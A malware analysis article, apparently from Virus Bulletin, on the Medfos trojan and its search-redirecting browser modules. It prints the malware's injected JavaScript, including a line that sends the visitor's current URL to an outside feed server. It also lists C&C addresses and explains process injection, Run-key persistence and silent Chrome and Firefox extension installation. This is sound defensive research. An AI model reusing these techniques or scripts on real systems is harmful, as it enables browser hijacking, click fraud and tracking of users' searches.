@@ -1,0 +1,136 @@
+Medfos– an all-purpose redirector
+2014-01-07
+
+Benjamin Chang
+Fortinet
+,
+Canada
+
+Neo Tan
+Fortinet
+,
+Canada
+Editor:
+Helen
+
+Martin
+Abstract
+Medfos is a heavily obfuscated trojan family which downloads modules capable of redirecting search engine results in the most popular browsers. Benjamin Chang and Neo Tan dissect the way the Medfos downloader deploys its downloaded modules, and the function of each.
+Copyright © 2014 Virus Bulletin
+
+Medfos is a heavily obfuscated trojan family which downloads modules capable of redirecting search engine results in the most popular browsers, including Chrome, Firefox and Internet Explorer. Its main module, the downloader, was found to be distributed via the Sasfis botnet. This article dissects the way the Medfos downloader deploys its downloaded modules, and the function of each.
+
+The DLL downloader
+The outermost layer of the Medfos downloader behaves as a code injector to the msiexec.exe process, where it performs its main payload. The assembly code is heavily obfuscated. It uses a combination of encrypted strings, dummy calls, junk code and opaque predicates to cause IDA functions to be chopped up inaccurately in the default setting, and causes the function graph overview window to be too complex to navigate accurately if the ‘Create functions if call is present’ option is turned off.
+First, Medfos obtains the handle of %system%/msiexec.exe by calling NtOpenFile. Prior to creating a process using the newly acquired file handle, the ZwCreateSection and NtMapViewOfSection routines are called to obtain a mapped view of msiexec.exe where the malware prepares and inserts decoded chunks of malicious code. CreateProcessInternalW is then used to create an instance of the msiexec.exe process in a suspended state. In between the typical NtGetContextThread and NtResumeThread API calls, the code injection is performed by two NtMapViewOfSection calls. The first NtMapViewOfSection call maps the bulk of the malicious code into the suspended process, while the second changes the entry point bytes of the suspended process to a jump into the malicious code.
+As the host process resumes the thread of the injected msiexec.exe, the injected process will perform its function as a downloader. It resolves some critical APIs and employs an anti-API hooking technique. As shown in Figure 1, the first five instructions of InternetOpenURL are copied to an allocated space at memory location 0x9400A0. When the trojan calls InternetOpenURL, it calls location 0x9400A0, which is followed by a jump to the sixth instruction of the original InternetOpenURL call, 0x771C5A6A. Thus, it avoids the API hook that hooks the first five instructions of the original call.
+Figure 1. Anti-API hook.
+(To view a larger version of Figure 1 please click here.)
+After some preparation, the downloader checks for network connectivity by attempting to connect to Google. If a network connection is verified, it issues a DNS query to cdn169.filesnetupload.com, which at the time of writing this article, returns the IP 78.140.131.159. However, the malware subsequently connects to the C&C server at 78.131.140.159 and reads a maximum of 0x108FF0 bytes of data. The IP of the server is a string decrypted at runtime, and the DNS query is probably a smokescreen intended to distract users and malware analysts. As shown in Figure 2, when communicating with the C&C server, the host is set as www.microsoft.com to further confuse the user. The data sent to the server is a hard-coded string pretending to be downloading a file from a legitimate site which has nothing to do with the C&C server.
+Figure 2. The host is set to www.microsoft.com, but the Get message is sent to IP 78.140.131.159.
+The response from the C&C server is encrypted with a simplified version of the Tiny Encryption Algorithm (TEA), with all four cache keys hard-coded to be 0x12345678. As illustrated in Figure 3 and Table 1, the server response contains two structures, each with a five-DWORD header and the body content of a portable executable (PE).
+Figure 3. Decoded responses.
+DWORD
+Use
+Note
+1
+Reserved
+Not used
+2
+A checksum of the PE contained in the current structure
+The checksum is a simple summation of all bytes in the PE
+3
+Size of the PE in current structure
+
+4
+Hash of export name to be called
+The checksum pseudo algorithm: For C = each character in NAME, CKM = CKM ror 7 CKM = CKM ^ C
+5
+End of this structure
+Absolute number of bytes from the beginning of buffer
+6+
+The PE bytes
+
+Table 1. Structure of the decoded response.
+Note that, as shown in Figure 3 and Table 1, the fourth DWORD is the hash of the DLL export name, which will be called by the downloader and the run key set up by the DLL itself. The downloaded DLL may be different each time as the server always responds with the newest variant.
+The downloaded DLL is loaded and initialized using ntdll.LdrLoadDll(). While most parts of the DLLs are encrypted, initializing the DLLs performs the decryption. To start the payload of the downloaded DLLs, the export defined by the fourth DWORD is called. When called within the host Medfos downloader, a constant is pushed as the argument to the export function. By matching the argument with the constant, the downloaded module is able to determine whether it is being invoked ‘legitimately’. Called within the downloader, the DLL first drops a copy of itself into %Application Data% with a name consisting of six randomly generated alphabet characters. Then it adds the following key in the registry entry under ‘SOFTWARE\Microsoft\Windows\CurrentVersion\Run’ to make sure it is executed at start up:
+<DLL name> = rundll32.exe <DLL path and DLL name>, <ExportName>
+Just before returning from the export function, to execute the DLL, CreateProcessW is called with the same rundll32.exe command line as the registry key just created.
+
+DLL module - redirector
+One of the downloaded DLL modules is a search result redirector for Google Chrome, Mozilla Firefox and Internet Explorer. Figure 4 shows search result redirection behaviour under Internet Explorer, while Figure 5 displays the network traffic generated during the multi-stage redirection process. As we have mentioned, loading the DLL module decrypts the DLL, and the decrypted DLL module is equipped with a different style of code obfuscation technique from its downloader. The strings are decrypted only immediately prior to their use and are erased straight after use. The APIs are also resolved only at runtime.
+Figure 4. Search result redirection. Notice that the topic of the redirected page is related to the search term.
+(To view a larger version of Figure 4 please click here.)
+Figure 5. Result of clicking on a link after searching for the term ‘penny stock’.
+(To view a larger version of Figure 5 please click here.)
+
+Chrome redirect
+After the redirector DLL module is executed, it drops and installs a .crx Google Chrome extension package. The extension package is first decoded and dropped into %Administrator\Local Settings\Application Data% with a randomly generated name in GUID (globally unique identifier) format. Then, to trigger installation of the Chrome extension, the following registry key is added [1]:
+HKLM\Software\Google\Chrome\Extensions\<32 randomly generated lower case characters>
+path = <full path of the .crx file>
+
+The strings contained in the Chrome extension scripts are encoded. The pseudo code of the decryption routine is as follows:
+Key = 0;
+OutString = “”;
+For Byte in Input:
+Byte = Byte ^ (Key&0xFF);
+OutString = OutString + toChar(Byte);
+Key++;
+End For
+Return OutString;
+
+The Appendix contains the de-obfuscated equivalent of the scripts contained within the .crx package. Once installed, the extension parses the document.location.href using regular expression matching. Depending on the situation, one of the following two actions might be triggered:
+If Google Instant search is detected, the script injected is:
+http://disable-instant-search.com/js/disable.js
+This contains the following JavaScript:
+try {
+var Links = document.getElementsByTagName(‘a’);
+var f = 0;
+for (var i = 0; f == 0 && i < Links.length; i++) {
+if (Links[i].href.indexOf(‘/setprefs?’) != -1) {
+var t = Links[i].href.search(/sig=([^&]+)/);
+if (t) {
+t = RegExp.$1;
+t = ‘/setprefs?&sig=’ + t + ‘&suggon=2’;
+var req = new XMLHttpRequest();
+req.open(‘GET’, t);
+req.send();
+f = 1;
+}
+}
+}
+} catch (err) {}
+
+If a link to a search result of one of the major search engines is identified, the injected script would be:
+ss+”?type=”+k3+”&user-agent=Mozilla%2F5.0+%28Windows+NT+5.1%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Chrome%2
+F12.0.742.112+Safari%2F534.30&ip=”+p+”&ref=”+encodeURIComponent(k2)+’&’+kladsjnkf
+Where:
+ss = ‘http://chrome-revision.com/feed’
+k3 = ‘search’ if searching in Google, Yahoo!, Ask, Bing or AOL
+k3 = ‘empty’ if visiting Yahoo!, Bing, Ask or AOL but not searching
+k2 = the current URL
+p = a randomly generated IP address starting with 84.
+The ‘http://chrome-revision.com/feed’ may also return a gzipped script which redirects the page to ‘http://googleads.i.doublee-click.net’, as shown in the Appendix. At this point, the server at ‘http://googleads.i.doublee-click.net’ might decide to further redirect the browser to another domain. The choice of redirected target depends on the search term. During the redirecting procedure, the browsing footprint is referred to a legitimate advertisement domain to simulate fake ad-clicks to generate revenue for the author. The network traffic of such a process generated by ‘http://googleads.i.doublee-click.net’ is illustrated in Figure 5.
+
+Firefox redirect
+If Mozilla Firefox is found to be installed, a Firefox extension performing the same function as the Chrome extension will also be installed. The script contained within the extension is essentially Firefox syntax of the same script as the Chrome extension. As Firefox does not officially advertise a method to install an extension without user confirmation, a more stealthy approach is taken here. To install the Firefox extension, the DLL module loads and calls the mozsqlite3.dll library to allow direct modification of the database behind the Firefox browser. To be exact, it calls sqlite3_open16 to open the Firefox database, followed by a series of sqlite3_exec SQL statements, as shown in Figure 6, to set up the installation [2]. The DLL module drops the file %<Firefox extension folder>%<randomly generated GUID>.xpi to complete the installation of the extension. Note that the GUID entered into the Firefox sqlite database must match the filename of the .xpi file, as shown in Figure 6 and Figure 7.
+Figure 6. Sqlite3_exec to include required information for Firefox to load an extension. GUID is highlighted in red.
+(To view a larger version of Figure 6 please click here.)
+Figure 7. Creating/dropping the actual .xpi file. GUID is highlighted in red.
+(To view a larger version of Figure 7 please click here.)
+
+Internet Explorer redirect
+The DLL module also implements a similar ad-clicking and redirecting behaviour for Internet Explorer. However, the implementation for IE is a little more involved. First, using CoInitialize and CoCreateInstance, an instance of iexplore.exe is created. Note that this instance of iexplore.exe lurks in the background without a visible window. SetWindowsHookExW is then called with idHook set to WH_GETMESSAGE and HOOKPROC pointing to a harmless container subroutine that eventually calls CallNextHook. The hooked function need not be malicious because the function of this Windows hook is to load the DLL module into the lurking iexplore.exe process and, as an artefact, into all other active processes that monitor messages using either PeekMessage or GetMessage. Once the injection is in place, UnhookWindowsHookEx is called to clean up the hook.
+Figure 8. SetWindowsHookExW sets the set_gAMA_fixed export function as HOOKPROC parameter.
+(To view a larger version of Figure 8 please click here.)
+In addition to the search result redirection performed through the server at ‘googleads.doublee-click.net’, as illustrated in Figure 4 and Figure 5, the lurker iexplore.exe simulates another ad clicking action to generate an additional stream of revenue. Figure 9 shows an instance where the URL for a Google search result page is referenced to the additional online advertisement domain.
+Figure 9. Redirection with InternetOpenUrlW while searching for the keyword ‘stock’ in Google. Notice that there is an IP prepended to the normal Google search URL.
+(To view a larger version of Figure 9 please click here.)
+
+Conclusion
+The design of the Medfos trojan provides great modularity and extensive security for the DLL modules that it distributes. It is also able to download and deploy an arbitrary number of DLL modules.
+As for the redirector DLL module that we have discussed, its ad-clicker functionality provides a method to generate revenue. It is also possible that the author is using the search engine usage information gathered for some other purpose. While the Internet Explorer version of the redirect/ad-clicker functionality causes a major and noticeable slow down in the browser, the Firefox and Google Chrome extensions are both simple and reliable.
+
+Bibliography
+[1] http://developer.chrome.com/extensions/external_extensions.html.
+[2] http://research.zscaler.com/2012/09/how-to-install-silently-malicious.html.
